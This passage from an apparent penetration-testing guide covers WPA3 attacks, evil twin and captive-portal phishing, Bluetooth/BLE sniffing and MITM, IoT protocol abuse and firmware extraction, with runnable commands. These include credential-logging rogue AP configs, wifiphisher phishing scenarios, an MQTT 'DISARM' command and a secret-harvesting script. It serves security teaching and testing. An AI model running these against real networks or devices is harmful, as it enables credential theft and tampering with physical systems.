#        jtr NETNTLM: jsmith:$NETNTLM$a1b2c3d4e5f6a7b8$1a2b3c4d...

# Crack MSCHAPv2 with hashcat
hashcat -m 5500 captured_netntlm.txt /usr/share/wordlists/rockyou.txt

# Or use asleap for quick NTLMv1 cracking
asleap -C a1:b2:c3:d4:e5:f6:a7:b8 -R 1a:2b:3c:4d:5e:6f:... \
  -W /usr/share/wordlists/rockyou.txt
```

### 3.6 KARMA and MANA Attacks

**KARMA**: When a client sends probe requests for previously connected networks, a KARMA attack responds to every probe request claiming to be the requested network. The client connects to the attacker's AP believing it is a known network.

**MANA** (More Advanced NACK Attack): Improves upon KARMA by correctly handling the 802.11 association process and maintaining ACLs of probe requests per client, ensuring more reliable client connection.

```bash
# eaphammer implements both KARMA and MANA
# Install eaphammer
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
sudo python3 kali-setup

# KARMA/MANA attack with captive portal
sudo python3 eaphammer -i wlan0 --auth open --hostile-portal \
  --karma --mac-whitelist target_macs.txt

# MANA with specific SSID targeting
sudo python3 eaphammer -i wlan0 --essid CorpNetwork \
  --auth wpa-eap --creds --mana
```

---

## 4. WPA3 Security Analysis

### 4.1 SAE — Simultaneous Authentication of Equals

WPA3-Personal replaces PSK with SAE (Simultaneous Authentication of Equals), defined in IEEE 802.11-2020 Section 12.4. SAE is based on the Dragonfly key exchange protocol (RFC 7664), a balanced Password-Authenticated Key Exchange (PAKE).

The SAE handshake consists of two phases:

**Commit Exchange**: Both parties derive a Password Element (PE) from the passphrase and exchange commit messages containing scalar and element values.

```
Station A                                            Station B
    │                                                    │
    │  1. PE = hash-to-curve(password, MAC_A, MAC_B)     │
    │  2. Choose random: rand_A, mask_A                  │
    │  3. scalar_A = (rand_A + mask_A) mod r             │
    │  4. element_A = -mask_A * PE                       │
    │                                                    │
    │         Commit(scalar_A, element_A)                 │
    │───────────────────────────────────────────────────▶│
    │                                                    │
    │         Commit(scalar_B, element_B)                 │
    │◀───────────────────────────────────────────────────│
    │                                                    │
    │  5. shared_secret = rand_A * (scalar_B * PE +      │
    │                     element_B)                      │
    │  6. KCK || PMK = KDF(shared_secret)                │
    │                                                    │
    │         Confirm(HMAC(KCK, scalars, elements))      │
    │───────────────────────────────────────────────────▶│
    │                                                    │
    │         Confirm(HMAC(KCK, scalars, elements))      │
    │◀───────────────────────────────────────────────────│
    │                                                    │
    │         4-Way Handshake (using SAE-derived PMK)     │
    │◀─────────────────────────────────────────────────▶│
```

SAE properties:
- **Forward secrecy**: Each session uses unique random values; compromising one session does not reveal past sessions.
- **Offline dictionary resistance**: An attacker who captures the commit exchange cannot test passwords offline because the hash-to-curve output is not verifiable without completing the protocol.
- **Mutual authentication**: Both parties prove knowledge of the password simultaneously.

### 4.2 Transition Mode Vulnerabilities

WPA3 transition mode allows WPA2 and WPA3 clients to coexist on the same network. The AP advertises both RSN capabilities in its beacon. Attacks against transition mode:

1. **Downgrade to WPA2**: An active attacker modifies the AP's beacon to remove the SAE AKM, forcing WPA3-capable clients to fall back to WPA2-PSK. Then the standard 4-way handshake capture and crack applies.

2. **SAE-to-PSK downgrade via PMKSA cache**: If the client has a cached PMKSA from a WPA2 connection, it may reuse it instead of performing SAE, bypassing WPA3 protections.

3. **BSS Transition Management frame abuse**: Manipulating 802.11v BSS Transition Management frames to steer clients to a rogue AP operating in WPA2-only mode.

```bash
# Detect WPA3 transition mode
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan.ssid -e wlan.rsn.akms.type
# AKM type 2 (PSK) + type 8 (SAE) = transition mode

# Force downgrade: create evil twin with WPA2-only
sudo hostapd <<'EOF'
interface=wlan1
ssid=TargetNetwork
channel=6
wpa=2
wpa_passphrase=capturedpassphrase
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
```

### 4.3 Dragonblood Vulnerabilities

The Dragonblood vulnerabilities (Vanhoef and Ronen, 2019) identified multiple weaknesses in the SAE/Dragonfly implementation:

**CVE-2019-9494 — SAE Cache-Based Side-Channel Attack**: The hash-to-curve operation in SAE performs a variable number of iterations depending on the password and MAC addresses. By measuring cache access patterns (Flush+Reload or cache timing), an attacker can determine the number of iterations and recover information about the password, reducing the offline search space.

**CVE-2019-9496 — SAE Confirm Missing State Validation**: Some implementations did not properly validate the SAE state machine, allowing an attacker to bypass authentication by replaying or forging confirm messages.

**CVE-2019-9494 (Brainpool variant)**: When Brainpool curves are used instead of NIST P-256, a timing side-channel in the quadratic residue test reveals whether a candidate password element lies on the curve, leaking password information.

Mitigation: Constant-time implementations of hash-to-curve and quadratic residue testing. Wi-Fi Alliance mandated patches via the Dragonfly Implementation Guidance.

### 4.4 OWE — Opportunistic Wireless Encryption

OWE (RFC 8110) replaces open (unencrypted) networks with encrypted connections using an unauthenticated Diffie-Hellman key exchange. It prevents passive eavesdropping but does not authenticate the AP, so evil twin attacks remain possible.

```
Station                                              AP
    │                                                │
    │  Probe/Association: OWE DH Public Key (STA)    │
    │───────────────────────────────────────────────▶│
    │                                                │
    │  Association Response: OWE DH Public Key (AP)  │
    │◀───────────────────────────────────────────────│
    │                                                │
    │  Both compute: shared_secret = DH(priv, pub)   │
    │  PMK = KDF(shared_secret)                      │
    │                                                │
    │  4-Way Handshake using PMK                     │
    │◀──────────────────────────────────────────────▶│
```

OWE transition mode: For backward compatibility, the AP broadcasts both an open SSID and an OWE SSID. The open SSID includes an OWE Transition Mode IE pointing to the OWE BSSID. Compliant clients automatically connect to the OWE network.

### 4.5 Testing WPA3 with hostapd

```bash
# WPA3-SAE only configuration
cat > /tmp/wpa3_test.conf << 'WPA3_EOF'
interface=wlan1
driver=nl80211
ssid=WPA3TestLab
hw_mode=g
channel=6
ieee80211n=1
ieee80211w=2          # PMF required (mandatory for WPA3)

wpa=2
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
sae_password=TestPassphrase123
sae_require_mfp=1
sae_pwe=2             # hash-to-element only (more secure than hunt-and-peck)

# Anti-clogging threshold (DoS protection)
sae_anti_clogging_threshold=5
WPA3_EOF

sudo hostapd /tmp/wpa3_test.conf

# WPA3-SAE Transition Mode (WPA2+WPA3)
cat > /tmp/wpa3_transition.conf << 'TRANS_EOF'
interface=wlan1
ssid=TransitionNet
channel=6
hw_mode=g
ieee80211n=1
ieee80211w=1          # PMF optional (required for transition mode)

wpa=2
wpa_key_mgmt=WPA-PSK SAE
wpa_passphrase=SharedPassphrase
rsn_pairwise=CCMP
sae_password=SharedPassphrase
sae_require_mfp=1
TRANS_EOF

sudo hostapd /tmp/wpa3_transition.conf
```

---

## 5. Rogue Access Point and Evil Twin

### 5.1 hostapd-wpe Configuration for Enterprise Attacks

Enterprise evil twin attacks require matching the target network's EAP configuration to avoid client-side warnings. Key configuration elements:

```bash
# Full enterprise evil twin configuration
cat > /tmp/evil_twin_enterprise.conf << 'EVIL_EOF'
# Interface settings
interface=wlan0
driver=nl80211
ssid=CorpWiFi-5G
channel=36
hw_mode=a
ieee80211n=1
ieee80211ac=1

# Match target AP capabilities
ht_capab=[HT40+][SHORT-GI-40][DSSS_CCK-40]
vht_oper_chwidth=1
vht_oper_centr_freq_seg0_idx=42

# WPA2-Enterprise
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP

# EAP server
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user

# Certificate configuration
# Critical: certificate CN/SAN should match legitimate RADIUS server
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh

# PEAP/TTLS support
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd-wpe
eap_fast_prov=3
EVIL_EOF

# Launch with credential logging
sudo hostapd-wpe /tmp/evil_twin_enterprise.conf | tee /tmp/captured_creds.log
```

### 5.2 Captive Portal Phishing

A captive portal evil twin combines a rogue AP with a web server that presents a phishing page mimicking a legitimate login portal. This is effective against networks that use web-based authentication (hotels, airports, corporate guest networks).

```bash
# Architecture:
#
# Client ──▶ Rogue AP ──▶ DHCP (dnsmasq) ──▶ DNS redirect ──▶ Captive Portal (nginx)
#                                                               │
#                                                               ▼
#                                                          Credential Log

# Step 1: Create rogue AP
cat > /tmp/captive_ap.conf << 'AP_EOF'
interface=wlan0
driver=nl80211
ssid=FreeAirportWiFi
channel=1
hw_mode=g
ieee80211n=1
AP_EOF

sudo hostapd /tmp/captive_ap.conf &

# Step 2: Configure networking
sudo ip addr add 10.0.0.1/24 dev wlan0
sudo sysctl net.ipv4.ip_forward=1

# Step 3: DHCP and DNS via dnsmasq
cat > /tmp/dnsmasq_captive.conf << 'DNS_EOF'
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1    # gateway
dhcp-option=6,10.0.0.1    # DNS server
address=/#/10.0.0.1        # redirect all DNS to captive portal
DNS_EOF

sudo dnsmasq -C /tmp/dnsmasq_captive.conf &

# Step 4: iptables redirect
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 \
  -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 \
  -j REDIRECT --to-port 8443

# Step 5: nginx captive portal (serve phishing page on 8080/8443)
# Clone the target portal using httrack or wget --mirror
# Modify forms to POST credentials to your capture endpoint
```

### 5.3 eaphammer

eaphammer consolidates multiple evil twin attack vectors into a single tool:

```bash
# Generate certificates mimicking a target organization
sudo python3 eaphammer --cert-wizard

# WPA2-Enterprise evil twin with credential capture
sudo python3 eaphammer -i wlan0 --essid CorpNetwork --channel 6 \
  --auth wpa-eap --creds

# Hostile portal attack (captive portal phishing)
sudo python3 eaphammer -i wlan0 --essid GuestWiFi --channel 1 \
  --auth open --hostile-portal

# PMKID capture
sudo python3 eaphammer -i wlan0 --essid TargetNet --channel 6 \
  --auth wpa-psk --pmkid

# GTC downgrade attack (force EAP-GTC instead of MSCHAPv2 to capture
# cleartext credentials)
sudo python3 eaphammer -i wlan0 --essid CorpNetwork --channel 6 \
  --auth wpa-eap --creds --negotiate gtc-downgrade
```

### 5.4 Wifiphisher

Wifiphisher automates evil twin + phishing attacks with pre-built phishing scenarios:

```bash
# Automatic evil twin with firmware update phishing page
sudo wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade

# Target specific network
sudo wifiphisher -aI wlan0 -eI wlan1 --essid TargetSSID \
  -p oauth-login --known-beacons

# Custom phishing page
sudo wifiphisher -aI wlan0 -eI wlan1 -p plugin_update \
  --handshake-capture /tmp/handshake.cap

# Available phishing scenarios:
# firmware-upgrade  — "Your router needs a firmware update, enter WPA password"
# oauth-login       — OAuth-style login page
# wifi_connect      — "Connect to WiFi" page requesting credentials
# plugin_update     — Browser plugin update page
```

### 5.5 Detection and Prevention — WIDS/WIPS/802.11w

**Wireless Intrusion Detection System (WIDS)** sensors continuously monitor the RF environment for rogue APs, deauthentication floods, and anomalous client behavior. **WIPS** extends detection with active countermeasures (e.g., sending targeted deauthentication frames to disconnect clients from rogue APs — legally contentious).

**802.11w (Protected Management Frames / PMF)**: Encrypts and authenticates unicast management frames (deauthentication, disassociation, action frames) using the session's PTK. Broadcast management frames are protected with BIP (Broadcast Integrity Protocol) using the IGTK.

PMF modes:
- **Capable (ieee80211w=1)**: AP supports PMF but does not require it. Clients that support PMF will use it.
- **Required (ieee80211w=2)**: Mandatory for WPA3. All clients must support PMF to connect.

Even with PMF, the initial authentication/association frames remain unprotected, so an attacker can still prevent new connections (though not disconnect established ones).

---

## 6. Bluetooth and BLE Security

### 6.1 Bluetooth Classic

Bluetooth Classic (BR/EDR, Basic Rate/Enhanced Data Rate) operates in the 2.4 GHz ISM band using frequency-hopping spread spectrum (FHSS) across 79 channels with 1 MHz spacing.

#### SDP Enumeration

The Service Discovery Protocol reveals available services, protocol versions, and device capabilities:

```bash
# Scan for Bluetooth devices
hcitool scan
# 00:11:22:33:44:55    TargetDevice

# Extended inquiry — device class, manufacturer
hcitool inq --flush

# SDP enumeration — list all services
sdptool browse 00:11:22:33:44:55

# Common service UUIDs to look for:
# 0x1101 — Serial Port Profile (SPP) — often unprotected
# 0x1105 — OBject Push Profile (OPP)
# 0x1106 — File Transfer Profile (FTP)
# 0x1112 — Headset Audio Gateway
# 0x110A — Audio Source (A2DP)
# 0x1115 — Personal Area Networking (PAN)

# bluesnarfer — access OBEX Push profile
bluesnarfer -r 1-100 -b 00:11:22:33:44:55

# Probe specific RFCOMM channels
rfcomm connect hci0 00:11:22:33:44:55 1
```

#### Pairing Attacks

Bluetooth pairing security depends on the Secure Simple Pairing (SSP) association model:

| Model | IO Capabilities | Security | Attack Vector |
|-------|----------------|----------|---------------|
| Just Works | NoInputNoOutput + any | Lowest — no MITM protection | Passive eavesdropping, MITM |
| Numeric Comparison | Display+Yes/No on both | High | Social engineering, UI spoofing |
| Passkey Entry | Display + Keyboard | High | Shoulder surfing |
| Out of Band (OOB) | NFC or other channel | Highest | OOB channel compromise |

**KNOB Attack (Key Negotiation of Bluetooth, CVE-2019-9506)**: Forces the encryption key entropy negotiation down to 1 byte (8 bits), making brute-force trivial. Affects Bluetooth BR/EDR prior to Bluetooth 5.1 with enforced minimum key size.

**BIAS Attack (Bluetooth Impersonation AttackS, CVE-2020-10135)**: Exploits the lack of mutual authentication in the Bluetooth legacy and secure authentication procedures. An attacker who knows the BD_ADDR of a previously paired device can impersonate it without possessing the link key.

### 6.2 Bluetooth Low Energy (BLE)

BLE (Bluetooth 4.0+) operates on 40 channels (37 data, 3 advertising) with 2 MHz spacing. BLE is pervasive in IoT: fitness trackers, smart locks, medical devices, industrial sensors.

#### GATT Enumeration

The Generic Attribute Profile (GATT) defines the service and characteristic hierarchy that exposes device functionality:

```bash
# gatttool — connect and enumerate services/characteristics
gatttool -b AA:BB:CC:DD:EE:FF -I
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> primary
# attr handle: 0x0001, end grp handle: 0x000b uuid: 00001800-...  (Generic Access)
# attr handle: 0x000c, end grp handle: 0x000f uuid: 00001801-...  (Generic Attribute)
# attr handle: 0x0010, end grp handle: 0x0022 uuid: 0000180a-...  (Device Information)
# attr handle: 0x0023, end grp handle: 0xffff uuid: 0000fff0-...  (Custom Service)

[AA:BB:CC:DD:EE:FF][LE]> characteristics
# handle: 0x0024, char properties: 0x12, char value handle: 0x0025,
#   uuid: 0000fff1-... (Custom Characteristic — read/notify)
# handle: 0x0027, char properties: 0x08, char value handle: 0x0028,
#   uuid: 0000fff2-... (Custom Characteristic — write)

# Read a characteristic value
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0025

# Write to a characteristic (e.g., unlock command)
[AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x0028 01

# Using bluetoothctl (modern alternative)
bluetoothctl
> scan on
> connect AA:BB:CC:DD:EE:FF
> menu gatt
> list-attributes
> select-attribute /org/bluez/hci0/dev_AA_BB_CC_DD_EE_FF/service000a/char000b
> read
> write "0x01"

# bettercap BLE enumeration
sudo bettercap
> ble.recon on
> ble.enum AA:BB:CC:DD:EE:FF
```

#### BLE Eavesdropping

BLE advertising packets are unencrypted and broadcast. Data channel packets are encrypted only if pairing has been performed. Legacy pairing (BLE 4.0-4.1) uses a Temporary Key (TK) that is zero for Just Works pairing, making passive decryption trivial if the pairing exchange is captured.

BLE 4.2+ introduced LE Secure Connections using ECDH P-256, providing passive eavesdropping resistance. However, many IoT devices still use legacy pairing for backward compatibility.

#### BLE Relay/Replay Attacks

Smart locks and access control devices using BLE proximity are vulnerable to relay attacks where two attackers extend the BLE range:

```
[Legitimate Device] ◀──BLE──▶ [Attacker A/Relay] ◀──Internet──▶ [Attacker B/Relay] ◀──BLE──▶ [Smart Lock]
```

The relay forwards BLE PDUs between the device and lock in real-time, making the lock believe the legitimate device is in proximity.

### 6.3 BLE Sniffing Hardware

| Tool | Interface | BLE Version | Capabilities |
|------|-----------|-------------|--------------|
| Ubertooth One | USB | BLE 4.x, BT Classic | Full spectrum monitoring, promiscuous capture |
| nRF52840 Dongle | USB | BLE 5.0 | BLE sniffer, direction finding, Thread/Zigbee |
| Sniffle (TI CC1352/CC26x2) | USB/UART | BLE 5.x | Extended advertising, coded PHY, connection following |
| HackRF One | USB | Any (SDR) | Raw IQ capture, requires software demodulation |

```bash
# Ubertooth One — follow BLE connections
ubertooth-btle -f -t AA:BB:CC:DD:EE:FF

# Ubertooth — promiscuous BLE sniffing on advertising channels
ubertooth-btle -p

# nRF Sniffer with Wireshark
# Install nRF Sniffer for Bluetooth LE Wireshark plugin
# Flash nRF52840 dongle with sniffer firmware
# Open Wireshark, select nRF Sniffer interface
# Filter: btle.advertising_header || btle.data_header

# Sniffle — advanced BLE 5 sniffer
python3 sniffle_hw.py -a -e  # follow advertisements and existing connections
python3 sniffle_hw.py -t AA:BB:CC:DD:EE:FF  # follow specific device
```

### 6.4 BtleJuice — MITM for BLE

BtleJuice creates a MITM proxy between a BLE peripheral and central device, allowing real-time interception and modification of GATT operations:

```bash
# Architecture requires two BLE adapters
# Adapter 1: acts as fake peripheral (clones target device)
# Adapter 2: connects to real peripheral as a central

# Start BtleJuice core (on machine with Adapter 2)
btlejuice-proxy -i hci1

# Start BtleJuice UI (on machine with Adapter 1, or same machine)
btlejuice -u 127.0.0.1 -w  # web UI on port 8080

# In the web UI:
# 1. Select target device to clone
# 2. BtleJuice creates a fake device with cloned services
# 3. Victim central (e.g., mobile app) connects to the fake device
# 4. All GATT read/write operations are proxied and logged
# 5. Modify values in transit to test application robustness
```

### 6.5 Firmware Extraction via BLE

Some IoT devices expose firmware update services over BLE (Device Firmware Update, DFU). If the DFU service does not validate firmware signatures, it can be used for both extraction and malicious firmware upload.

```bash
# Identify DFU service (Nordic Semiconductor DFU UUID)
# Service: 00001530-1212-efde-1523-785feabcd123
# Control Point: 00001531-...
# Packet: 00001532-...

# Use nRF Connect app or nrfutil to interact with DFU
nrfutil dfu ble -ic NRF52 -pkg firmware.zip -p /dev/ttyACM0 -n "TargetDevice"

# If the device allows firmware readback (rare but devastating):
# Connect via gatttool and read the firmware characteristic range
```

---

## 7. IoT Attack Surface

### 7.1 IoT Architecture Layers

IoT systems follow a layered architecture where each layer presents distinct attack surfaces:

```
┌─────────────────────────────────────────────────────────────┐
│                   Application Layer                         │
│  Cloud platforms, APIs, web dashboards, mobile apps         │
│  Attacks: API abuse, insecure auth, data exposure           │
├─────────────────────────────────────────────────────────────┤
│                   Network Layer                             │
│  WiFi, BLE, Zigbee, Z-Wave, LoRaWAN, cellular, Ethernet    │
│  Attacks: MITM, replay, protocol exploitation, DoS          │
├─────────────────────────────────────────────────────────────┤
│                   Perception Layer                          │
│  Sensors, actuators, embedded processors, firmware          │
│  Attacks: hardware tampering, firmware extraction,          │
│           side-channel, fault injection                     │
└─────────────────────────────────────────────────────────────┘
```

### 7.2 OWASP IoT Top 10 (2024)

| # | Vulnerability | Description |
|---|--------------|-------------|
| I1 | Weak, Guessable, or Hardcoded Passwords | Default credentials, no password change enforcement, brute-force susceptibility |
| I2 | Insecure Network Services | Unnecessary open ports, unencrypted services, UPnP/mDNS exposure |
| I3 | Insecure Ecosystem Interfaces | Cloud API, mobile app, web interface vulnerabilities |
| I4 | Lack of Secure Update Mechanism | No firmware signature validation, no encrypted delivery, no anti-rollback |
| I5 | Use of Insecure or Outdated Components | Known CVEs in libraries, old kernel, deprecated crypto |
| I6 | Insufficient Privacy Protection | PII collection without consent, unencrypted data storage/transmission |
| I7 | Insecure Data Transfer and Storage | Cleartext protocols (HTTP, MQTT without TLS, CoAP without DTLS) |
| I8 | Lack of Device Management | No asset inventory, no update mechanism, no decommissioning process |
| I9 | Insecure Default Settings | Open ports by default, verbose debugging enabled, sample credentials |
| I10 | Lack of Physical Hardening | Exposed UART/JTAG, removable storage, no tamper detection |

### 7.3 Common IoT Protocols

#### MQTT (Message Queuing Telemetry Transport)

MQTT uses a publish/subscribe model over TCP (port 1883, TLS on 8883). The MQTT broker manages topic subscriptions and message routing.

```bash
# Discover MQTT brokers (Shodan/network scan)
nmap -p 1883,8883 -sV target_network/24

# Connect to unauthenticated MQTT broker
mosquitto_sub -h target_broker -t '#' -v
# '#' subscribes to ALL topics — immediately reveals all device communication

# Common sensitive topics:
# home/alarm/status
# device/+/telemetry
# sensor/temperature/kitchen
# $SYS/# — broker system information

# Publish malicious commands
mosquitto_pub -h target_broker -t 'home/alarm/command' -m 'DISARM'
mosquitto_pub -h target_broker -t 'device/thermostat/set' -m '{"temp": 99}'

# MQTT exploitation with Python (paho-mqtt)
python3 << 'MQTT_SCRIPT'
import paho.mqtt.client as mqtt
import json

def on_connect(client, userdata, flags, rc):
    print(f"Connected with result code {rc}")
    client.subscribe("#")  # Subscribe to everything

def on_message(client, userdata, msg):
    print(f"Topic: {msg.topic}")
    print(f"Payload: {msg.payload.decode()}")
    try:
        data = json.loads(msg.payload)
        # Look for credentials, tokens, PII
        for key in ['password', 'token', 'key', 'secret', 'credential']:
            if key in str(data).lower():
                print(f"[!] SENSITIVE DATA FOUND: {msg.topic}")
    except json.JSONDecodeError:
        pass

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect("target_broker", 1883, 60)
client.loop_forever()
MQTT_SCRIPT
```

#### CoAP (Constrained Application Protocol)

CoAP (RFC 7252) is a UDP-based REST-like protocol for constrained devices. It uses port 5683 (5684 for DTLS). CoAP supports GET, PUT, POST, DELETE methods and uses compact binary headers.

```bash
# CoAP discovery
coap-client -m get coap://target/.well-known/core

# Read a resource
coap-client -m get coap://target/sensor/temperature

# Modify a resource
coap-client -m put coap://target/actuator/relay -e '{"state": "on"}'

# CoAP has no built-in authentication — relies on DTLS (RFC 6347)
# Many implementations omit DTLS entirely
```

#### Zigbee (IEEE 802.15.4)

Zigbee operates on 2.4 GHz (16 channels), 915 MHz (10 channels, Americas), and 868 MHz (1 channel, Europe). Used in home automation, smart lighting, and industrial sensing.

Zigbee security relies on two key types:
- **Network Key**: Shared AES-128 key for network-layer encryption. If the coordinator transmits the key unencrypted during device joining (a common default), it can be captured.
- **Trust Center Link Key**: Used for end-to-end application-layer encryption. The default Trust Center Link Key for ZigBee Home Automation is the well-known `ZigBeeAlliance09` key.

```bash
# KillerBee framework for Zigbee attacks
# Requires compatible hardware: RZUSBSTICK, ApiMote, or TI CC2531

# Scan for Zigbee networks
zbstumbler

# Capture Zigbee traffic
zbdump -f 15 -c 11 -w zigbee_capture.pcap
# -f 15: channel 15
# -c 11: capture count

# Decrypt with known network key in Wireshark:
# Edit → Preferences → Protocols → ZigBee → Pre-configured keys
# Add: key=ZigBeeAlliance09, byte order=Normal, label=default

# Key sniffing during device joining
zbdump -f 15 -c 0 -w joining_capture.pcap
# Then power-cycle a Zigbee device to force rejoin
```

#### Z-Wave

Z-Wave operates on sub-GHz frequencies (908.42 MHz in the US, 868.42 MHz in Europe), providing better range and wall penetration than 2.4 GHz protocols. Z-Wave uses AES-128 for encryption.

**S0 Security (Z-Wave Classic)**: The network key exchange during device inclusion uses a temporary key of all zeros, allowing an attacker who captures the inclusion process to recover the network key. This is the well-known S0 downgrade attack.

**S2 Security (Z-Wave 700+)**: Uses ECDH key exchange with PIN or QR code verification. Significantly more secure, but backward compatibility with S0 devices remains a weakness.

```bash
# Z-Wave analysis requires SDR (HackRF, YARD Stick One)
# or dedicated Z-Wave transceiver (Silicon Labs UZB-7)

# Scapy-radio with HackRF for Z-Wave capture
# EZ-Wave framework for Z-Wave exploitation
```

#### LoRaWAN

LoRaWAN provides long-range (2-15 km urban, 40+ km rural), low-power IoT connectivity. It uses AES-128 for encryption with two session keys:

- **NwkSKey**: Network Session Key — validates message integrity (MIC) and encrypts MAC commands
- **AppSKey**: Application Session Key — encrypts application payload

**LoRaWAN 1.0 vulnerabilities**: The join procedure transmits the DevNonce and AppNonce in cleartext. If the AppKey (root key) is compromised (hardcoded in firmware, shared across devices), all sessions can be derived.

### 7.4 IoT Firmware Analysis

Firmware analysis is a cornerstone of IoT security testing. The firmware often contains hardcoded credentials, private keys, undocumented backdoors, and vulnerable library versions.

```bash
# Step 1: Obtain firmware
# - Download from manufacturer's website
# - Extract from device via UART/JTAG/SPI
# - Capture OTA update packets
# - Request from manufacturer under responsible disclosure

# Step 2: Initial analysis with binwalk
binwalk firmware.bin
# DECIMAL       HEXADECIMAL     DESCRIPTION
# 0             0x0             LZMA compressed data
# 65536         0x10000         Squashfs filesystem, little endian, version 4.0
# 4194304       0x400000        JFFS2 filesystem, big endian

# Extract embedded filesystems
binwalk -e firmware.bin
cd _firmware.bin.extracted/

# Step 3: Filesystem analysis
# Mount squashfs
sudo unsquashfs squashfs-root.img
ls squashfs-root/

# Search for credentials and keys
grep -r "password\|passwd\|secret\|key\|token" squashfs-root/etc/
grep -r "BEGIN.*PRIVATE KEY" squashfs-root/
find squashfs-root/ -name "*.pem" -o -name "*.key" -o -name "shadow" \
  -o -name "passwd"

# Step 4: Binary analysis
file squashfs-root/usr/bin/httpd
# ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1

strings squashfs-root/usr/bin/httpd | grep -i "admin\|password\|backdoor"

# Step 5: EMBA (Embedded Analyzer) — automated firmware analysis
# https://github.com/e-m-b-a/emba
sudo ./emba -f ~/firmware.bin -l ~/emba_logs
# EMBA checks: CVEs, hardcoded creds, crypto issues, kernel config,
# binary protections (NX, ASLR, stack canary, RELRO, PIE)

# Step 6: firmware-mod-kit — modify and repack firmware
./extract-firmware.sh firmware.bin
# Make modifications...
./build-firmware.sh
# Produces modified firmware image for reflashing
```

### 7.5 Hardware Interfaces

Physical access to IoT devices often exposes debug interfaces that bypass all software security:

#### UART (Universal Asynchronous Receiver/Transmitter)

UART provides serial console access, often exposing a root shell or bootloader.

```bash
# Identify UART pins on PCB
# Look for 4-pin headers: VCC, TX, RX, GND
# Use a multimeter to identify GND (continuity to ground plane)
# Use logic analyzer or oscilloscope to identify TX (active during boot)

# Common UART settings: 115200 baud, 8N1

# Connect with USB-to-UART adapter (e.g., FTDI FT232, CP2102)
# Connect: Device TX → Adapter RX, Device RX → Adapter TX, GND → GND
# Do NOT connect VCC (power the device from its own supply)

screen /dev/ttyUSB0 115200
# or
minicom -D /dev/ttyUSB0 -b 115200

# If baud rate is unknown, use baudrate.py (auto-detect)
python3 baudrate.py -p /dev/ttyUSB0
```

#### JTAG (Joint Test Action Group) / SWD (Serial Wire Debug)

JTAG/SWD provides full debugger access to the CPU, enabling memory read/write, firmware extraction, and live debugging.

```bash
# JTAG with OpenOCD
# Identify JTAG pins: TCK, TMS, TDI, TDO, GND (optionally TRST, SRST)
# Use JTAGulator or manual probing to identify pinout

cat > openocd.cfg << 'JTAG_EOF'
source [find interface/ftdi/olimex-arm-usb-ocd.cfg]
transport select jtag
source [find target/stm32f4x.cfg]
adapter speed 1000
JTAG_EOF

openocd -f openocd.cfg

# In another terminal, connect via GDB
arm-none-eabi-gdb
(gdb) target remote :3333
(gdb) monitor halt
(gdb) monitor flash read_image /tmp/firmware_dump.bin 0x08000000 0x100000

# SWD (ARM Cortex-M, requires only SWDIO + SWCLK + GND)
cat > openocd_swd.cfg << 'SWD_EOF'
source [find interface/cmsis-dap.cfg]
transport select swd
source [find target/nrf52.cfg]
SWD_EOF

openocd -f openocd_swd.cfg
```

#### SPI Flash Extraction

Many IoT devices store firmware on SPI flash chips (Winbond W25Q, Macronix MX25L). These can be read directly with a SPI programmer.

```bash
# Using flashrom with a CH341A programmer
flashrom -p ch341a_spi -r firmware_dump.bin

# Verify dump integrity (read twice, compare)
flashrom -p ch341a_spi -r firmware_dump_verify.bin
md5sum firmware_dump.bin firmware_dump_verify.bin

# Write modified firmware back
flashrom -p ch341a_spi -w modified_firmware.bin
```

---

## 8. IoT Penetration Testing Methodology

### 8.1 Scoping IoT Engagements

IoT penetration testing scope must explicitly cover all layers of the IoT ecosystem. Unlike web application testing, IoT engagements involve physical hardware, radio frequencies, and potentially safety-critical systems.

**Scope definition checklist for IoT engagements:**

- **Device inventory**: Model numbers, firmware versions, hardware revisions, quantity
- **Communication protocols**: WiFi, BLE, Zigbee, Z-Wave, LoRaWAN, cellular, proprietary RF
- **Cloud/backend services**: API endpoints, cloud provider (AWS IoT, Azure IoT Hub, Google Cloud IoT)
- **Mobile applications**: iOS/Android companion apps, version numbers
- **Physical access authorization**: Can testers open device enclosures? Desolder components? Modify hardware?
- **RF transmission authorization**: Does testing require FCC/ETSI compliance considerations? SDR transmission may require licensed spectrum authorization.
- **Safety systems**: Are safety-critical functions (fire suppression, emergency shutoff, medical devices) in scope? Define kill-chain boundaries.
- **Data handling**: Sensor data may include PII (cameras, microphones, health sensors). Define data retention and destruction policies.
- **Firmware modification**: Can testers flash modified firmware? Is there a bricking risk? Spare devices available?
- **Third-party integrations**: IFTTT, Alexa, Google Home, HomeKit — are these in scope?

### 8.2 Physical Security Assessment

Physical security testing for IoT devices encompasses:

1. **Enclosure tamper resistance**: Can the device be opened without visible damage? Are tamper-evident seals used? Is there a tamper detection circuit?

2. **Debug interface accessibility**: Are UART/JTAG/SWD pads accessible? Are they labeled? Are they protected by a conformal coating or epoxy potting?

3. **Storage accessibility**: Can the SPI/eMMC/SD flash be removed or read in-circuit? Is the firmware encrypted at rest?

4. **Component identification**: Photograph the PCB and identify all ICs. Cross-reference part numbers with datasheets to identify attack surfaces (crypto accelerators, secure elements, debug bridges).

